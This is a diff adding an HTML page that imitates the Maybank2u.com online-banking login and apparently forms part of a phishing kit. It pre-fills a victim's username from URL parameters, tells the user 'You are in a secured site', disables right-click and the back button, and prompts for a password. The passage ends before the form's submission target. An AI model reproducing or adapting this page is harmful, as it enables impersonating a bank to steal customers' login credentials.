@@ -1,0 +1,2302 @@
+
+<!DOCTYPE html>
+<html><head>
+	<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+	<title>Maybank2u.com - Online Banking</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=1">
+	<link rel="stylesheet" type="text/css" media="screen" href="MBB_Pass_files/popup.css">
+	<script type="text/javascript" src="MBB_Pass_files/common.js"></script>
+	<script type="text/javascript" src="MBB_Pass_files/popup.js"></script>
+
+	<script language="JavaScript">
+
+//Disable right click script III- By Renigade (renigade@mediaone.net)
+//For full source code, visit http://www.dynamicdrive.com
+
+var message="";
+
+function clickIE() {if (document.all) {(message);return false;}}
+function clickNS(e) {if 
+(document.layers||(document.getElementById&&!document.all)) {
+if (e.which==2||e.which==3) {(message);return false;}}}
+if (document.layers) 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+
+document.oncontextmenu=new Function("return false")
+
+</script>
+	<!--  disable browser back-->
+	<script type="text/javascript">
+
+function changeHashOnLoad1() {
+     window.location.href += "#";
+     setTimeout("changeHashAgain1()", "50"); 
+}
+
+function changeHashAgain1() {
+	window.location.href += "1";
+
+	var storedHash = window.location.hash;
+	window.setInterval(function () {
+	    if (window.location.hash != storedHash) {
+			window.location.hash = storedHash;
+	    }
+	}, 50);
+}
+
+// Add a script element as a child of the body
+function downloadJSAtOnload1() {
+	changeHashOnLoad1();
+}
+// Check for browser support of event handling capability
+if (window.addEventListener)
+	window.addEventListener("load",	downloadJSAtOnload1, false);
+else if (window.attachEvent)
+	window.attachEvent("onload", downloadJSAtOnload1);
+else
+	window.onload = downloadJSAtOnload1;
+
+</script>
+
+
+
+
+	<script type="text/javascript" src="MBB_Pass_files/jquery-1.js"></script>
+	<!--20EF -a-->
+	<script type="text/javascript">
+<!--
+//Paul Tero, July 2001
+//http://www.tero.co.uk/des/
+//
+//Optimised for performance with large blocks by Michael Hayworth, November 2001
+//http://www.netdealing.com
+//
+//THIS SOFTWARE IS PROVIDED "AS IS" AND
+//ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+//IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+//ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
+//FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+//DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
+//OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+//HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
+//LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
+//OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
+//SUCH DAMAGE.
+//des
+//this takes the key, the message, and whether to encrypt or decrypt
+function des(key,message,encrypt,mode,iv,padding){var spfunction1=new Array(0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);var spfunction2=new Array(-0x7fef7fe0,-0x7fff8000,0x8000,0x108020,0x100000,0x20,-0x7fefffe0,-0x7fff7fe0,-0x7fffffe0,-0x7fef7fe0,-0x7fef8000,-0x80000000,-0x7fff8000,0x100000,0x20,-0x7fefffe0,0x108000,0x100020,-0x7fff7fe0,0,-0x80000000,0x8000,0x108020,-0x7ff00000,0x100020,-0x7fffffe0,0,0x108000,0x8020,-0x7fef8000,-0x7ff00000,0x8020,0,0x108020,-0x7fefffe0,0x100000,-0x7fff7fe0,-0x7ff00000,-0x7fef8000,0x8000,-0x7ff00000,-0x7fff8000,0x20,-0x7fef7fe0,0x108020,0x20,0x8000,-0x80000000,0x8020,-0x7fef8000,0x100000,-0x7fffffe0,0x100020,-0x7fff7fe0,-0x7fffffe0,0x100020,0x108000,0,-0x7fff8000,0x8020,-0x80000000,-0x7fefffe0,-0x7fef7fe0,0x108000);var spfunction3=new Array(0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);var spfunction4=new Array(0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);var spfunction5=new Array(0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);var spfunction6=new Array(0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);var spfunction7=new Array(0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);var spfunction8=new Array(0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);var keys=des_createKeys(key);var m=0,i,j,temp,temp2,right1,right2,left,right,looping;var cbcleft,cbcleft2,cbcright,cbcright2
+var endloop,loopinc;var len=message.length;var chunk=0;var iterations=keys.length==32?3:9;if(iterations==3){looping=encrypt?new Array(0,32,2):new Array(30,-2,-2);}
+else{looping=encrypt?new Array(0,32,2,62,30,-2,64,96,2):new Array(94,62,-2,32,64,2,30,-2,-2);}
+if(padding==2)message+="        ";else if(padding==1){temp=8-(len%8);message+=String.fromCharCode(temp,temp,temp,temp,temp,temp,temp,temp);if(temp==8)len+=8;}
+else if(!padding)message+="\0\0\0\0\0\0\0\0";result="";tempresult="";if(mode==1){cbcleft=(iv.charCodeAt(m++)<<24)|(iv.charCodeAt(m++)<<16)|(iv.charCodeAt(m++)<<8)|iv.charCodeAt(m++);cbcright=(iv.charCodeAt(m++)<<24)|(iv.charCodeAt(m++)<<16)|(iv.charCodeAt(m++)<<8)|iv.charCodeAt(m++);m=0;}
+while(m<len){left=(message.charCodeAt(m++)<<24)|(message.charCodeAt(m++)<<16)|(message.charCodeAt(m++)<<8)|message.charCodeAt(m++);right=(message.charCodeAt(m++)<<24)|(message.charCodeAt(m++)<<16)|(message.charCodeAt(m++)<<8)|message.charCodeAt(m++);if(mode==1){if(encrypt){left^=cbcleft;right^=cbcright;}else{cbcleft2=cbcleft;cbcright2=cbcright;cbcleft=left;cbcright=right;}}
+temp=((left>>>4)^right)&0x0f0f0f0f;right^=temp;left^=(temp<<4);temp=((left>>>16)^right)&0x0000ffff;right^=temp;left^=(temp<<16);temp=((right>>>2)^left)&0x33333333;left^=temp;right^=(temp<<2);temp=((right>>>8)^left)&0x00ff00ff;left^=temp;right^=(temp<<8);temp=((left>>>1)^right)&0x55555555;right^=temp;left^=(temp<<1);left=((left<<1)|(left>>>31));right=((right<<1)|(right>>>31));for(j=0;j<iterations;j+=3){endloop=looping[j+1];loopinc=looping[j+2];for(i=looping[j];i!=endloop;i+=loopinc){right1=right^keys[i];right2=((right>>>4)|(right<<28))^keys[i+1];temp=left;left=right;right=temp^(spfunction2[(right1>>>24)&0x3f]|spfunction4[(right1>>>16)&0x3f]|spfunction6[(right1>>>8)&0x3f]|spfunction8[right1&0x3f]|spfunction1[(right2>>>24)&0x3f]|spfunction3[(right2>>>16)&0x3f]|spfunction5[(right2>>>8)&0x3f]|spfunction7[right2&0x3f]);}
+temp=left;left=right;right=temp;}
+left=((left>>>1)|(left<<31));right=((right>>>1)|(right<<31));temp=((left>>>1)^right)&0x55555555;right^=temp;left^=(temp<<1);temp=((right>>>8)^left)&0x00ff00ff;left^=temp;right^=(temp<<8);temp=((right>>>2)^left)&0x33333333;left^=temp;right^=(temp<<2);temp=((left>>>16)^right)&0x0000ffff;right^=temp;left^=(temp<<16);temp=((left>>>4)^right)&0x0f0f0f0f;right^=temp;left^=(temp<<4);if(mode==1){if(encrypt){cbcleft=left;cbcright=right;}else{left^=cbcleft2;right^=cbcright2;}}
+tempresult+=String.fromCharCode((left>>>24),((left>>>16)&0xff),((left>>>8)&0xff),(left&0xff),(right>>>24),((right>>>16)&0xff),((right>>>8)&0xff),(right&0xff));chunk+=8;if(chunk==512){result+=tempresult;tempresult="";chunk=0;}}
+return result+tempresult;}
+function des_createKeys(key){pc2bytes0=new Array(0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);pc2bytes1=new Array(0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);pc2bytes2=new Array(0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);pc2bytes3=new Array(0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);pc2bytes4=new Array(0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);pc2bytes5=new Array(0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);pc2bytes6=new Array(0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);pc2bytes7=new Array(0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);pc2bytes8=new Array(0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);pc2bytes9=new Array(0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);pc2bytes10=new Array(0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);pc2bytes11=new Array(0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);pc2bytes12=new Array(0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);pc2bytes13=new Array(0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);var iterations=key.length>8?3:1;var keys=new Array(32*iterations);var shifts=new Array(0,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0);var lefttemp,righttemp,m=0,n=0,temp;for(var j=0;j<iterations;j++){left=(key.charCodeAt(m++)<<24)|(key.charCodeAt(m++)<<16)|(key.charCodeAt(m++)<<8)|key.charCodeAt(m++);right=(key.charCodeAt(m++)<<24)|(key.charCodeAt(m++)<<16)|(key.charCodeAt(m++)<<8)|key.charCodeAt(m++);temp=((left>>>4)^right)&0x0f0f0f0f;right^=temp;left^=(temp<<4);temp=((right>>>-16)^left)&0x0000ffff;left^=temp;right^=(temp<<-16);temp=((left>>>2)^right)&0x33333333;right^=temp;left^=(temp<<2);temp=((right>>>-16)^left)&0x0000ffff;left^=temp;right^=(temp<<-16);temp=((left>>>1)^right)&0x55555555;right^=temp;left^=(temp<<1);temp=((right>>>8)^left)&0x00ff00ff;left^=temp;right^=(temp<<8);temp=((left>>>1)^right)&0x55555555;right^=temp;left^=(temp<<1);temp=(left<<8)|((right>>>20)&0x000000f0);left=(right<<24)|((right<<8)&0xff0000)|((right>>>8)&0xff00)|((right>>>24)&0xf0);right=temp;for(var i=0;i<shifts.length;i++){if(shifts[i]){left=(left<<2)|(left>>>26);right=(right<<2)|(right>>>26);}
+else{left=(left<<1)|(left>>>27);right=(right<<1)|(right>>>27);}
+left&=-0xf;right&=-0xf;lefttemp=pc2bytes0[left>>>28]|pc2bytes1[(left>>>24)&0xf]|pc2bytes2[(left>>>20)&0xf]|pc2bytes3[(left>>>16)&0xf]|pc2bytes4[(left>>>12)&0xf]|pc2bytes5[(left>>>8)&0xf]|pc2bytes6[(left>>>4)&0xf];righttemp=pc2bytes7[right>>>28]|pc2bytes8[(right>>>24)&0xf]|pc2bytes9[(right>>>20)&0xf]|pc2bytes10[(right>>>16)&0xf]|pc2bytes11[(right>>>12)&0xf]|pc2bytes12[(right>>>8)&0xf]|pc2bytes13[(right>>>4)&0xf];temp=((righttemp>>>16)^lefttemp)&0x0000ffff;keys[n++]=lefttemp^temp;keys[n++]=righttemp^(temp<<16);}}
+return keys;}
+function stringToHex(s){var r="";var hexes=new Array("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");for(var i=0;i<s.length;i++){r+=hexes[s.charCodeAt(i)>>4]+hexes[s.charCodeAt(i)&0xf];}
+return r;}
+function hexToString(h){var r="";for(var i=(h.substr(0,2)=="0x")?2:0;i<h.length;i+=2){r+=String.fromCharCode(parseInt(h.substr(i,2),16));}
+return r;}
+//-->
+</script>
+
+	<script type="text/javascript">
+<!--
+var keyVal;function setValue(val)
+{keyVal=val.substring(4,12);}
+$(document).ready(function(){
+	const queryString = window.location.search
+   const urlParams = new URLSearchParams(queryString)
+
+   document.getElementById("uname").value = urlParams.get("uname");
+   document.getElementById("pass_user").innerHTML = urlParams.get("uname");
+   document.getElementById("b").value = urlParams.get("b");
+	
+	$(document).keypress(function(e){var keycode=(e.keyCode?e.keyCode:e.which);if(keycode=='13'){var x=document.getElementById("username1Error");var y=document.getElementById("password1Error");if(x==null&&y==null){}
+else
+if(x!=null&&y!=null)
+{document.getElementById("serverSideError").innerHTML="Please click \"Login\" to proceed.";}
+else
+if(x!=null)
+{x.innerHTML="Please click \"Next\" to proceed.";}
+else
+if(y!=null)
+{y.innerHTML="Please click \"Login\" to proceed.";}
+return false;}});});function putUsenameStar()
+{with(document.forms[0]){if(username1.value.length>=6){username1.focus();}}}
+function putPasswordStar()
+{with(document.forms[0]){if(password1.value.length>=8){password1.value=password1.value.replace(/./g,'*');username.value=stringToHex(des(keyVal,username.value,1,0,"",1));password1.focus();}}}
+function putUsenamePasswordStar()
+{with(document.forms[0]){if(username1.value.length>=6&&password1.value.length>=8){password1.value=password1.value.replace(/./g,'*');password1.focus();}}}
+function checkField(orifield,dummyfield)
+{orifield.value=stringToHex(des(keyVal,dummyfield.value,1,0,"",1));}
+
+function putPasswordStar1()
+{
+	with (document.forms[0]) {
+	
+    	if($('.password1').val().length >= 8){
+	    	username.value = stringToHex(des (keyVal, username.value, 1, 0, "", 1));
+	    	$('.password1').val($('.password1').val().replace(/./g,'*'));
+	    	$('.dummy').val($('.dummy').val().replace(/./g,'*'));
+	    	$('.password1').focus();
+    	}
+    }
+}
+
+function checkField1(orifield, dummyfield)
+{
+	orifield.val(stringToHex(des (keyVal, dummyfield.val(), 1, 0, "", 1)));
+}
+//-->
+</script>
+	<!--20EF -z-->
+
+	<script type="text/javascript">
+setValue("@@@@1194477203.1656083605@@@@");            
+</script>
+
+	<style type="text/css">
+div.overlay {
+	width: 100%;
+	position:absolute;
+	background-color:none;
+	z-index:100;
+}
+
+div.overlayBox
+{
+	position:fixed;
+	z-index:99;
+	visibility:hidden;
+	width:400px;
+	/* background-color:#DDD; 
+	filter:alpha(opacity=85);-moz-opacity: 0.85; opacity: 0.85;*/
+}
+
+div.overlayBox p
+{
+	text-align: center;
+	padding: 20px;
+	font-size: 18px;
+}
+
+</style>
+
+	<!--[if lte IE 6]>
+	<style type="text/css">
+div.overlayBox {
+	position: absolute;
+}
+</style>
+	<![endif]-->
+</head>
+<body onload="hideOverlay();" onpageshow="hideOverlay();">
+<div id="overlay" class="overlay" style="visibility: hidden;">
+	<div id="overlayBox" class="overlayBox" style="visibility: hidden;">
+		<p><img src="MBB_Pass_files/loading.gif"></p>
+	</div>
+	<table id="div_table" onclick="promptMessagePopUp()">
+		<tbody><tr>
+			<td id="div_td" valign="middle" align="center">
+			</td>
+		</tr>
+		</tbody></table>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+	// window.resizeTo(530, 700)
+
+	function onClickClose (e) {
+		window.close ();
+	}
+</script>
+
+<script type="text/javascript" src="MBB_Pass_files/jquery-1.js"></script>
+
+<script type="text/javascript">
+$(window).load(function(){
+	//for each description div...
+	$('div.description').each(function(){
+		//...set the opacity to 0...
+		$(this).css('opacity', 0);
+		//..set width same as the image...
+		$(this).css('width', $(this).siblings('img').width());
+		//...get the parent (the wrapper) and set it's width same as the image width... '
+		$(this).parent().css('width', $(this).siblings('img').width());
+		//...set the display to block
+		$(this).css('display', 'block');
+	});
+	
+	$('div.wrapper').hover(function(){
+		//when mouse hover over the wrapper div
+		//get it's children elements with class descriptio
+		//and show it using fadeTo
+		$(this).children('.description').stop().fadeTo(500, 0.7);
+	},function(){
+		//when mouse out of the wrapper div
+		//use fadeTo to hide the div
+		$(this).children('.description').stop().fadeTo(500, 0);
+	}); 
+
+});
+  
+</script>
+<style> 
+div.wrapper{
+	position:relative; /* important(so we can absolutely position the description div */ 
+}
+div.description{
+	position:absolute; /* absolute position (so we can position it where we want)*/
+	bottom:0px; /* position will be on bottom */
+	left:0px;
+	display:none; /* hide it */
+	/* styling bellow */
+	background-color:black;
+	font-family: 'tahoma';
+	font-size:8px;
+	color:white;
+}
+div.description_content{
+	padding:5px;
+	text-align:center;}
+}
+</style>
+<script type="text/javascript"> 
+var char = 0;
+var caption = "";
+var captionVal = "";
+var standby;
+ 
+function showCaption(obj) {
+	caption = obj.attr('title');
+	if(caption)
+		type();
+}
+ 
+function type() {	
+	$('#caption').html(caption.substr(0, char++));
+	captionVal = caption;
+	if(char < caption.length+1)
+		setTimeout("type()", 28);
+	else {
+		char = 0;
+		caption = captionVal;
+	}	
+}
+ 
+$(function() {
+	$('#images a').each(function() {
+		$(this).mouseover(function() {
+			showCaption($(this));
+		}).mouseout(function() {
+			hideCaption($(this));
+		})
+	});
+});
+</script>
+<style type="text/css"> 
+#caption {
+	background: #DADADA;
+	width:320px;
+	color:red;
+	height:55px;
+	font-size:12px;
+	font-weight: bold;
+	margin-left:3px;
+}
+
+img {border: none;}
+</style>
+<script type="text/javascript" language="Javascript1.1"> 
+
+<!-- Begin 
+
+     var bCancel = false; 
+
+    function validateAdaptMerchantLoginForm2a1(form) {                                                                   
+        if (bCancel) 
+      return true; 
+        else 
+       return validatePasswordStar(form) && validateRequired(form) && validateMinLength(form); 
+   } 
+
+    function passwordStar () { 
+     this.aa = new Array("password1", "Invalid username/password. Click 'Forgot Login' to reset your login details.", new Function ("varName", "this.minlength='8';  return this[varName];"));
+    } 
+
+    function required () { 
+     this.aa = new Array("password1", "Password is required.", new Function ("varName", "this.minlength='8';  return this[varName];"));
+    } 
+
+    function minlength () { 
+     this.aa = new Array("password1", Invalid username/password. Click 'Forgot Password' to reset your password., new Function ("varName", "this.minlength='8';  return this[varName];"));
+    } 
+
+
+
+function validatePasswordStar (form)
+		    {
+				var overAllValid = true;
+                var isValid = true;
+		        var focusField = null;
+		        var i = 0;
+		        var fields = new Array();
+		        oPasswordStar = new passwordStar();
+
+		        for (x in oPasswordStar)
+		        {
+		            isValid = true;
+		            var field = $('.password1');
+					var msg = '';
+
+		            if (field.attr('type') == 'text' ||
+		                field.attr('type') == 'textarea' ||
+		                field.attr('type') == 'password')
+					{
+		                var value = field.val();
+
+						len = value.length;
+
+						var foundNumeric = false;
+						var foundAlphabet = false;
+						var foundStar = false;
+
+						if (len > 0)
+						{
+							for (j = 0; j < len; j++)
+							{
+								code = value.charCodeAt(j);
+
+							    if ((code >= 65 && code <= 90) ||
+							    	(code >= 97 && code <= 122) )
+							   	{
+									foundAlphabet = true;
+							   	}
+							   	else if ((code >= 48 && code <= 57))
+							   	{
+							   		foundNumeric = true;
+							   	}
+							   	else if ((code == 42))
+							   	{
+							   		foundStar = true;
+							   	}
+							}
+
+							if ( !(foundAlphabet && foundNumeric) && !foundStar)
+							{
+								if (i == 0)
+		                        {
+		                            focusField = field;
+		                        }
+
+		                        fields[i++] = oPasswordStar[x][1];
+		                        msg = oPasswordStar[x][1];
+		                        overAllValid = isValid = false;
+							}
+
+							errorMessageHandler (isValid, field.attr('name'), msg);
+						}
+		            }
+		        }
+
+		        if (fields.length > 0)
+		        {
+		            focusField.focus();
+		            //alert(fields.join('\n'));
+		        }
+
+		        return overAllValid;
+			}
+function validateRequired(form) {
+                var overAllValid = true;
+                var isValid = true;
+                var focusField = null;
+                var i = 0;
+                var fields = new Array();
+                oRequired = new required();
+                for (x in oRequired) {
+                	isValid = true;
+                	var field = $('.password1');
+					var msg = '';
+
+                    if (field.attr('type') == 'text' ||
+                        field.attr('type') == 'textarea' ||
+                        field.attr('type') == 'file' ||
+                        field.attr('type') == 'select-one' ||
+                        field.attr('type') == 'textarea' ||
+                        field.attr('type') == 'radio' ||
+                        field.attr('type') == 'password') {
+
+                        var value = '';
+						// get field's value
+						if (field.attr('type') == "select-one") {
+							var si = field.selectedIndex;
+							value = field.options[si].value;
+						} else {
+							value = field.val();
+						}
+
+                        if (trim(value).length == 0) {
+
+	                        if (i == 0) {
+	                            focusField = field;
+	                        }
+	                        fields[i++] = oRequired[x][1];
+	                        msg = oRequired[x][1];
+	                        overAllValid = isValid = false;
+                        }
+
+						errorMessageHandler (isValid, field.attr('name'), msg);
+                    }
+                }
+                if (fields.length > 0) {
+                   focusField.focus();
+                   //alert(fileds.join('\n'));
+                }
+                return overAllValid;
+            }
+function validateMinLength(form) {
+                var overAllValid = true;
+                var isValid = true;
+                var focusField = null;
+                var i = 0;
+                var fields = new Array();
+                oMinLength = new minlength();
+                for (x in oMinLength) {
+                	isValid = true;
+                    var field = $('.password1');
+					var msg = '';
+                    if (field.attr('type') == 'text' ||
+                        field.attr('type') == 'textarea' ||
+                        field.attr('type') == 'password') {
+
+                        var iMin = parseInt(oMinLength[x][2]("minlength"));
+                        if ((trim(field.val()).length > 0) && (field.val().length < iMin)) {
+                            if (i == 0) {
+                                focusField = field;
+                            }
+                            fields[i++] = oMinLength[x][1];
+                            msg = oMinLength[x][1];
+                            overAllValid = isValid = false;
+                        }
+
+						errorMessageHandler (isValid, field.attr('name'), msg);
+                    }
+                }
+                if (fields.length > 0) {
+                   focusField.focus();
+                   //alert(fields.join('\n'));
+                }
+                return overAllValid;
+            }
+
+//End --> 
+</script>
+<!--
+<div id="header" style="z-index:200;">
+<h1>Welcome</h1>
+<p class="popupClose"><input type="button" name="buttonClose" value="Close" onclick="window.close();" class="button transparent"></p>
+</div>
+-->
+<!-- /#header -->
+
+<div id="content" class="font-family-lato font-size-base bg-gold px-content">
+
+	<div id="login" class="clearfix common_box_shadow max-width-xs mx-auto" style="border:0px solid #888;z-index: 1;position:relative;background-color:#000">
+		<div class="paddingdiv">
+			<!--<div style="z-index:1;position:relative;float:left">
+				<h1>Welcome</h1>
+			</div>
+			<div style="padding-top:30px"></div>-->
+			<div>
+				<div class="paddingdiv">
+					<div style="float: left"><img src="MBB_Pass_files/logo.gif" style="border:0px" oncontextmenu="return false;" onmousedown="return false;" ondrag="return false;"></div>
+					<div style="float: right">
+						<p class="popupClose my-2">
+							<input type="button" name="buttonClose" value="Close" onclick="onClickClose(event)" style="color:#FFF" class="button transparent">
+						</p>
+					</div>
+				</div>
+			</div>
+
+			<div class="clearfix"></div>
+
+			<div class="common_box" style="border:1px solid #888;background-color:#FFF">
+				<div style="text-align: center;z-index: 1"><h3>&nbsp;</h3></div>
+				<div id="loginMain" style="border:2px solid #888;margin: 0 auto;z-index: 1;" class="common_box w-loginmain">
+					<div class="p-login">
+						<h2 class="font-size-subhead" style="z-index: 1;position:relative;">Log in to Maybank2u.com online banking</h2>
+						<blockquote class="note mx-0 rounded bg-white-05 font-size-dec mb-4" style="z-index: 1;position:relative;">
+							<strong>Note:</strong><br>
+							<ul class="pl-ul my-ul">
+								<li>You are in a secured site.</li>
+
+							</ul>
+						</blockquote>
+
+
+						<!--RSA //-->
+						<!--RSA //-->
+						<!--3param remove pm_fp.js-->
+
+						<table id="loginTable" style="margin: 0 auto;z-index: 99;" class="w-100">
+							<tbody>
+							<!-- <tr>
+                            <td colspan="3" align="center">
+                                <div class="common_box_shadow" style="border:5px solid #FFCC00;background:#fff;z-index: 99;width:100px;height:100px;position:relative;">
+                                    <div style="padding:auto;margin-top:2px;">
+                                    <table style="position: relative;border:1px solid #fff;z-index: 99;">
+                                          <tbody><tr>
+                                            <td class="py-0">
+                                                <div class="wrapper" style="background-color: rgb(255, 255, 255); border: 1px solid rgb(255, 255, 255); width: 80px;">
+
+                                                    <img src="MBB_Pass_files/IAB_CL1_PX01452.jpg" style="width:80px;height:80px;border:0px" oncontextmenu="return false;" onmousedown="return false;" ondrag="return false;">
+                                                    <div class="description" style="opacity: 0; width: 80px; display: block;">
+                                                        <div class="description_content"><b>Password</b></div>
+                                                    </div>
+                                                </div>
+                                            </td>
+                                        </tr>
+                                    </tbody></table>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+
+                        <tr>
+                            <td colspan="3" class="text-center">
+                            <div style="text-align:center;position: relative;;z-index: 1;">
+
+                            </div>
+                            </td>
+                        </tr> -->
+
+							<tr>
+								<td colspan="3" class="text-center">
+									<label id="usernameLabel"><span id="usernameErrorSymbol"></span><b>Username</b></label>:&nbsp;
+									<!--<input type="text" name="username" maxlength="16" size="16" autocomplete="off" value="">--><!--wrongpassworderror-->
+									<span id="pass_user"></span>
+								</td>
+							</tr>
+
+							<tr>
+								<td colspan="3" class="text-center">&nbsp;</td>
+							</tr>
+
+							<tr>
